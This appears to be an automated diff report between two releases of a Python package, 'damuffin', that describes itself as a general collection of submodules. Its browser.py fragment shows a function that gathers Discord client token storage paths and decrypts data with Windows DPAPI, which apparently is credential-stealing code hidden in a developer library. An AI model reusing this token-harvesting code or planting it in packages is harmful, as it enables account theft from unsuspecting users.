# Comparing `tmp/damuffin-1.6.0-py3-none-any.whl.zip` & `tmp/damuffin-1.6.1-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,15 +1,15 @@
-Zip file size: 18122 bytes, number of entries: 13
--rw-rw-rw-  2.0 fat       40 b- defN 22-Oct-20 00:24 damuffin/__init__.py
--rw-rw-rw-  2.0 fat    19186 b- defN 22-Oct-26 21:29 damuffin/browser.py
--rw-rw-rw-  2.0 fat    12005 b- defN 22-Oct-22 21:04 damuffin/damuffin.py
--rw-rw-rw-  2.0 fat     6614 b- defN 22-Oct-22 20:58 damuffin/elog.py
--rw-rw-rw-  2.0 fat      588 b- defN 22-Oct-21 16:33 damuffin/hector.py
--rw-rw-rw-  2.0 fat     8619 b- defN 22-Oct-23 18:01 damuffin/net.py
--rw-rw-rw-  2.0 fat     2994 b- defN 22-Oct-23 18:12 damuffin/star.py
--rw-rw-rw-  2.0 fat     8118 b- defN 22-Oct-23 19:21 damuffin/sysinfo.py
--rw-rw-rw-  2.0 fat     1089 b- defN 22-Oct-26 21:30 damuffin-1.6.0.dist-info/LICENSE
--rw-rw-rw-  2.0 fat      660 b- defN 22-Oct-26 21:30 damuffin-1.6.0.dist-info/METADATA
--rw-rw-rw-  2.0 fat       92 b- defN 22-Oct-26 21:30 damuffin-1.6.0.dist-info/WHEEL
--rw-rw-rw-  2.0 fat        9 b- defN 22-Oct-26 21:30 damuffin-1.6.0.dist-info/top_level.txt
-?rw-rw-r--  2.0 fat      987 b- defN 22-Oct-26 21:30 damuffin-1.6.0.dist-info/RECORD
-13 files, 61001 bytes uncompressed, 16498 bytes compressed:  73.0%
+Zip file size: 18133 bytes, number of entries: 13
+-rw-rw-rw-  2.0 fat       40 b- defN 23-Apr-13 03:02 damuffin/__init__.py
+-rw-rw-rw-  2.0 fat    19186 b- defN 23-Apr-13 03:05 damuffin/browser.py
+-rw-rw-rw-  2.0 fat    12005 b- defN 23-Apr-13 03:02 damuffin/damuffin.py
+-rw-rw-rw-  2.0 fat     6614 b- defN 23-Apr-13 03:02 damuffin/elog.py
+-rw-rw-rw-  2.0 fat      588 b- defN 23-Apr-13 03:02 damuffin/hector.py
+-rw-rw-rw-  2.0 fat     8619 b- defN 23-Apr-13 03:02 damuffin/net.py
+-rw-rw-rw-  2.0 fat     2994 b- defN 23-Apr-13 03:02 damuffin/star.py
+-rw-rw-rw-  2.0 fat     8118 b- defN 23-Apr-13 03:02 damuffin/sysinfo.py
+-rw-rw-rw-  2.0 fat     1089 b- defN 23-Apr-13 03:10 damuffin-1.6.1.dist-info/LICENSE
+-rw-rw-rw-  2.0 fat      681 b- defN 23-Apr-13 03:10 damuffin-1.6.1.dist-info/METADATA
+-rw-rw-rw-  2.0 fat       92 b- defN 23-Apr-13 03:10 damuffin-1.6.1.dist-info/WHEEL
+-rw-rw-rw-  2.0 fat        9 b- defN 23-Apr-13 03:10 damuffin-1.6.1.dist-info/top_level.txt
+-rw-rw-r--  2.0 fat      987 b- defN 23-Apr-13 03:10 damuffin-1.6.1.dist-info/RECORD
+13 files, 61022 bytes uncompressed, 16509 bytes compressed:  72.9%
```

## zipnote {}

```diff
@@ -18,23 +18,23 @@
 
 Filename: damuffin/star.py
 Comment: 
 
 Filename: damuffin/sysinfo.py
 Comment: 
 
-Filename: damuffin-1.6.0.dist-info/LICENSE
+Filename: damuffin-1.6.1.dist-info/LICENSE
 Comment: 
 
-Filename: damuffin-1.6.0.dist-info/METADATA
+Filename: damuffin-1.6.1.dist-info/METADATA
 Comment: 
 
-Filename: damuffin-1.6.0.dist-info/WHEEL
+Filename: damuffin-1.6.1.dist-info/WHEEL
 Comment: 
 
-Filename: damuffin-1.6.0.dist-info/top_level.txt
+Filename: damuffin-1.6.1.dist-info/top_level.txt
 Comment: 
 
-Filename: damuffin-1.6.0.dist-info/RECORD
+Filename: damuffin-1.6.1.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## damuffin/browser.py

```diff
@@ -75,15 +75,15 @@
         except:
             try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
             except: return "Unsupported"
     
     def get_discord_tokens(self, browsers: dict[str, str]):
         paths = {b: p for b, p in {
             **{b: p + "\\Local Storage\\leveldb\\" for b, p in browsers.items()},
-            'discord': roaming + '\\discord\\Local Storage\\leveldb\\',
+            'discord': roaming + '\\Discord\\Local Storage\\leveldb\\',
             'discordcanary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
             'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
             'discordptb': roaming + '\\discordptb\\Local Storage\\leveldb\\'
         }.items() if path_exists(p)}
 
         discord_tokens = []
         for browser, path in paths.items():
```

## Comparing `damuffin-1.6.0.dist-info/LICENSE` & `damuffin-1.6.1.dist-info/LICENSE`

 * *Files identical despite different names*

## Comparing `damuffin-1.6.0.dist-info/METADATA` & `damuffin-1.6.1.dist-info/METADATA`

 * *Files 8% similar despite different names*

```diff
@@ -1,21 +1,21 @@
-Metadata-Version: 2.1
-Name: damuffin
-Version: 1.6.0
-Summary: A collection of different submodules.
-Home-page: https://github.com/DaMuffinDev/damuffin.py
-Author: DaMuffinDev
-License: MIT
-Keywords: damuffin
-Classifier: Development Status :: 3 - Alpha
-Classifier: Intended Audience :: Developers
-Classifier: License :: OSI Approved :: MIT License
-Classifier: Programming Language :: Python :: 3.10
-License-File: LICENSE
-Requires-Dist: pycryptodome (==3.15.0)
-Requires-Dist: pylzma (==0.5.0)
-Requires-Dist: netifaces (==0.11.0)
-Requires-Dist: wmi (==1.5.1)
-Requires-Dist: requests (==2.28.1)
-Requires-Dist: pywin32
-
-https://github.com/DaMuffinDev/damuffin.py/wiki
+Metadata-Version: 2.1
+Name: damuffin
+Version: 1.6.1
+Summary: A collection of different submodules.
+Home-page: https://github.com/DaMuffinDev/damuffin.py
+Author: DaMuffinDev
+License: MIT
+Keywords: damuffin
+Classifier: Development Status :: 3 - Alpha
+Classifier: Intended Audience :: Developers
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3.10
+License-File: LICENSE
+Requires-Dist: pycryptodome (==3.15.0)
+Requires-Dist: pylzma (==0.5.0)
+Requires-Dist: netifaces (==0.11.0)
+Requires-Dist: wmi (==1.5.1)
+Requires-Dist: requests (==2.28.1)
+Requires-Dist: pywin32
+
+https://github.com/DaMuffinDev/damuffin.py/wiki
```

## Comparing `damuffin-1.6.0.dist-info/RECORD` & `damuffin-1.6.1.dist-info/RECORD`

 * *Files 17% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 damuffin/__init__.py,sha256=YF4V8pG_-fTxEez9BDqqlVPYugIaLjtrN0-trF25JPQ,40
-damuffin/browser.py,sha256=UMFu0G59qQ08Y46zco4WiZ4X-SvlH0Ba1mZcOIIbJDE,19186
+damuffin/browser.py,sha256=3c1RhnI67CCyR9Do3HSOWc6fmR9L_OJQKsvcXo5qacg,19186
 damuffin/damuffin.py,sha256=v05iLC7mP7vm42lVaQq-OIgdlYYSLxAG90kCSWyjyAk,12005
 damuffin/elog.py,sha256=tOMaczzsbrbHA4Q77EUAQiM5UaJRh5hwV2DM4eBEuHY,6614
 damuffin/hector.py,sha256=xvsrt3rAhQPoSd3KbKkeBlQ0DTQ4618eHIux3euhDn0,588
 damuffin/net.py,sha256=jq7s-PPVi4C_AcTbCm2zQpoqOQFb7AQ9Z3D05HEnmbE,8619
 damuffin/star.py,sha256=hEsF2qjeX9ib7vmX_fxA8NRj_afmEc5qzLWTnskPBTM,2994
 damuffin/sysinfo.py,sha256=Tdp8LNk32mcs_87N8m-oiY5p7ngv7QiYc_Ts3qZ_pWc,8118
-damuffin-1.6.0.dist-info/LICENSE,sha256=oRN7OX7W-nf6kpgw7LUqW4WhQu86A2axu51b-U3MA0U,1089
-damuffin-1.6.0.dist-info/METADATA,sha256=hlM_B4sNIsP0PtO4qOdoLH6wODKOc_YvL-w2JcLfoG4,660
-damuffin-1.6.0.dist-info/WHEEL,sha256=G16H4A3IeoQmnOrYV4ueZGKSjhipXx8zc8nu9FGlvMA,92
-damuffin-1.6.0.dist-info/top_level.txt,sha256=jhAfX0gTmarlUxi8oinMg-Dndd0gKQ6B02gGwNTrwZ8,9
-damuffin-1.6.0.dist-info/RECORD,,
+damuffin-1.6.1.dist-info/LICENSE,sha256=oRN7OX7W-nf6kpgw7LUqW4WhQu86A2axu51b-U3MA0U,1089
+damuffin-1.6.1.dist-info/METADATA,sha256=FByI23J9d_f4gbAhAAXTf41141YZ5KhtzwmxY4DcF4o,681
+damuffin-1.6.1.dist-info/WHEEL,sha256=pkctZYzUS4AYVn6dJ-7367OJZivF2e8RA9b_ZBjif18,92
+damuffin-1.6.1.dist-info/top_level.txt,sha256=jhAfX0gTmarlUxi8oinMg-Dndd0gKQ6B02gGwNTrwZ8,9
+damuffin-1.6.1.dist-info/RECORD,,
```

